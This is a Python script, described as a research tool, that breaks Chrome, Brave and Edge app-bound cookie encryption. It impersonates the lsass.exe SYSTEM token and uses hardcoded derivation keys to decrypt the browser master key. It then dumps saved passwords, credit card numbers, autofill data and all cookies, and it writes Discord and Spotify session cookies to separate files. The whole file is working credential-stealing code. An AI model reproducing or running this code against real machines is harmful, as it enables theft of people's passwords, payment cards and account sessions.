import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import shutil
import argparse
from contextlib import contextmanager

import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305

#  Browser path registry

BROWSER_PATHS = {
    "chrome": {
        "local_state": r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\Google\Chrome\User Data",
        "cookies":     r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies",
        "login_data":  r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data",
        "web_data":    r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data",
    },
    "brave": {
        "local_state": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
        "cookies":     r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        "login_data":  r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "web_data":    r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Web Data",
    },
    "edge": {
        "local_state": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State",
        "user_data":   r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
        "cookies":     r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies",
        "login_data":  r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data",
        "web_data":    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Web Data",
    },
}
#  Privilege helpers

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    """Impersonate lsass.exe to obtain SYSTEM privilege for DPAPI."""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

#  Key blob parsing

def parse_key_blob(blob_data: bytes) -> dict:
    parsed_data = {}
    try:
        buffer = io.BytesIO(blob_data)

        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        assert header_len + content_len + 8 == len(blob_data)

        parsed_data['flag'] = buffer.read(1)[0]

        if parsed_data['flag'] in (1, 2):
            # [flag|iv|ciphertext|tag]
            parsed_data['iv']         = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag']        = buffer.read(16)

        elif parsed_data['flag'] == 3:
            # [flag|encrypted_aes_key|iv|ciphertext|tag]
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv']                = buffer.read(12)
            parsed_data['ciphertext']        = buffer.read(32)
            parsed_data['tag']               = buffer.read(16)

        else:
            raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    except Exception as e:
        print(f"[!] parse_key_blob error: {e}")

    return parsed_data

#  CNG decryption (flag == 3)

def decrypt_with_cng(input_data: bytes) -> bytes:
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    status = ncrypt.NCryptOpenStorageProvider(
        ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0
    )
    assert status == 0, f"NCryptOpenStorageProvider failed: {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
    assert status == 0, f"NCryptOpenKey failed: {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    # First call: get required buffer size
    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, None, 0,
        ctypes.byref(pcbResult), 0x40
    )
    assert status == 0, f"NCryptDecrypt (size query) failed: {status}"

    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    # Second call: actual decryption
    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None,
        output_buffer, pcbResult.value, ctypes.byref(pcbResult), 0x40
    )
    assert status == 0, f"NCryptDecrypt failed: {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

#  v20 master key derivation

def byte_xor(ba1: bytes, ba2: bytes) -> bytes:
    return bytes([a ^ b for a, b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    flag = parsed_data['flag']

    if flag == 1:
        aes_key = bytes.fromhex(
            "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"
        )
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    elif flag == 2:
        chacha_key = bytes.fromhex(
            "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
        )
        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])

    elif flag == 3:
        xor_key = bytes.fromhex(
            "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
        )
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    else:
        raise ValueError(f"Unsupported flag value: {flag}")

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

#  Core decryption helpers

def decrypt_v20(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        iv        = encrypted_value[3:15]
        payload   = encrypted_value[15:-16]
        tag       = encrypted_value[-16:]
        cipher    = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"<decryption failed: {e}>"

def try_decrypt(encrypted_value: bytes, master_key: bytes) -> str:
    if encrypted_value.startswith(b'v20'):
        return decrypt_v20(encrypted_value, master_key)
    elif encrypted_value.startswith((b'v10', b'v11')):
        return "<v10/v11 — use v10-v11_decryptor.py>"
    else:
        try:
            return windows.crypto.dpapi.unprotect(encrypted_value).decode()
        except Exception as e:
            return f"<DPAPI failed: {e}>"

#  Master key loader

def load_v20_master_key(browser: str) -> bytes:
    paths = BROWSER_PATHS[browser]
    local_state_path = os.path.expandvars(paths["local_state"])

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    os_crypt = local_state["os_crypt"]

    if "app_bound_encrypted_key" in os_crypt:
        print("[*] Using app_bound_encrypted_key")
        raw_key = os_crypt["app_bound_encrypted_key"]
    else:
        print("[*] Falling back to encrypted_key")
        raw_key = os_crypt["encrypted_key"]

    key_blob_encrypted = binascii.a2b_base64(raw_key)
    assert key_blob_encrypted[:4] == b"APPB", "Not an App-Bound key — may not be v20"
    key_blob_encrypted = key_blob_encrypted[4:]

    print("[*] Decrypting with SYSTEM DPAPI (LSASS impersonation)...")
    with impersonate_lsass():
        key_blob_system = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    print("[*] Decrypting with User DPAPI...")
    key_blob_user = windows.crypto.dpapi.unprotect(key_blob_system)

    parsed = parse_key_blob(key_blob_user)
    master_key = derive_v20_master_key(parsed)
    print(f"[+] v20 master key derived (flag={parsed['flag']})")
    return master_key

#  Grabbers

def dump_passwords(browser: str, master_key: bytes, output_file: str):
    login_db = os.path.expandvars(BROWSER_PATHS[browser]["login_data"])
    if not os.path.exists(login_db):
        print("[!] Login Data not found.")
        return

    tmp = os.path.join(os.environ['TEMP'], "login_data_tmp.db")
    shutil.copy2(login_db, tmp)

    print(f"\n{'='*60}")
    print(f"  [{browser.upper()}] Saved Passwords")
    print(f"{'='*60}\n")

    try:
        conn   = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        with open(output_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*60}\n[{browser.upper()}] Saved Passwords\n{'='*60}\n")
            for url, username, encrypted_pw in cursor.fetchall():
                password = try_decrypt(encrypted_pw, master_key)
                line = f"[{url}]  {username} : {password}"
                print(f"  {line}")
                f.write(line + "\n")

        conn.close()
        print(f"\n  Saved to {output_file}")
    finally:
        os.remove(tmp)


def dump_cards(browser: str, master_key: bytes):
    web_data = os.path.expandvars(BROWSER_PATHS[browser]["web_data"])
    if not os.path.exists(web_data):
        print("[!] Web Data not found.")
        return

    tmp = os.path.join(os.environ['TEMP'], "web_data_tmp.db")
    shutil.copy2(web_data, tmp)

    print(f"\n{'='*60}")
    print(f"  [{browser.upper()}] Credit Cards & Autofill")
    print(f"{'='*60}\n")

    try:
        conn   = sqlite3.connect(tmp)
        cursor = conn.cursor()

        cursor.execute("SELECT name, value FROM autofill")
        print("  -- Autofill --")
        for name, value in cursor.fetchall():
            print(f"  {name} : {value}")

        cursor.execute(
            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
            "FROM credit_cards"
        )
        print("\n  -- Credit Cards --")
        for name, month, year, cc_enc in cursor.fetchall():
            ccn = try_decrypt(cc_enc, master_key)
            print(f"  Name: {name}  |  CCN: {ccn}  |  Exp: {month}/{year}")

        conn.close()
    finally:
        os.remove(tmp)


def dump_cookies(browser: str, master_key: bytes):
    cookie_db = os.path.expandvars(BROWSER_PATHS[browser]["cookies"])
    if not os.path.exists(cookie_db):
        print("[!] Cookies DB not found.")
        return

    print(f"\n{'='*60}")
    print(f"  [{browser.upper()}] v20 Cookies")
    print(f"{'='*60}\n")

    con = sqlite3.connect(pathlib.Path(cookie_db).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies")
    cookies_v20 = [c for c in cur.fetchall() if c[2][:3] == b"v20"]
    con.close()

    # All cookies
    with open("decrypted_cookies.txt", "w", encoding="utf-8") as f:
        for host, name, enc in cookies_v20:
            value = decrypt_v20(enc, master_key)
            f.write(f"{host} {name} {value}\n")
    print(f"  All v20 cookies saved to decrypted_cookies.txt ({len(cookies_v20)} entries)")

    # Filtered: Discord & Spotify
    relevant_discord = {"__dcfduid", "__sdcfduid", "cf_clearance", "locale"}
    relevant_spotify = {"sp_dc", "sp_key"}

    with open("discord_cookies.txt", "w", encoding="utf-8") as df, \
         open("spotify_cookies.txt", "w", encoding="utf-8") as sf:
        for host, name, enc in cookies_v20:
            try:
                value = decrypt_v20(enc, master_key)
            except Exception:
                continue

            if "discord.com" in host and name in relevant_discord:
                line = f"{name}: {value}"
                print(f"  [Discord] {line}")
                df.write(line + "\n")
            elif "spotify.com" in host and name in relevant_spotify:
                line = f"{name}: {value}"
                print(f"  [Spotify] {line}")
                sf.write(line + "\n")

    print("  Discord cookies → discord_cookies.txt")
    print("  Spotify cookies → spotify_cookies.txt")

#  CLI

def parse_args():
    parser = argparse.ArgumentParser(
        description="v20 App-Bound Encryption Browser Decryptor — research tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "--browser", "-b",
        required=True,
        choices=list(BROWSER_PATHS.keys()),
        metavar="BROWSER",
        help="Target browser: chrome | brave | edge",
    )
    parser.add_argument(
        "--passwords", "-p",
        action="store_true",
        help="Dump saved passwords",
    )
    parser.add_argument(
        "--cards", "-c",
        action="store_true",
        help="Dump saved credit cards & autofill",
    )
    parser.add_argument(
        "--cookies", "-k",
        action="store_true",
        help="Dump v20 encrypted cookies",
    )
    parser.add_argument(
        "--all", "-a",
        action="store_true",
        help="Dump everything (passwords + cards + cookies)",
    )
    parser.add_argument(
        "--output", "-o",
        default="Saved_passwords.txt",
        help="Output file for passwords (default: Saved_passwords.txt)",
    )
    return parser.parse_args()


def main():
    args = parse_args()

    # Default to all if nothing specified
    nothing_specified = not any([args.passwords, args.cards, args.cookies, args.all])
    do_passwords = args.passwords or args.all or nothing_specified
    do_cards     = args.cards     or args.all or nothing_specified
    do_cookies   = args.cookies   or args.all or nothing_specified

    browser = args.browser.lower()
    if browser not in BROWSER_PATHS:
        print(f"[!] Unsupported browser '{browser}'. Choose from: {', '.join(BROWSER_PATHS)}")
        sys.exit(1)

    try:
        master_key = load_v20_master_key(browser)
    except FileNotFoundError:
        print(f"[!] Could not find {browser.title()} installation.")
        sys.exit(1)
    except AssertionError as e:
        print(f"[!] Key assertion failed: {e}")
        sys.exit(1)

    if do_passwords:
        dump_passwords(browser, master_key, args.output)
    if do_cards:
        dump_cards(browser, master_key)
    if do_cookies:
        dump_cookies(browser, master_key)


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    if not is_admin():
        print("[!] This script must be run as Administrator.")
        sys.exit(1)
    main()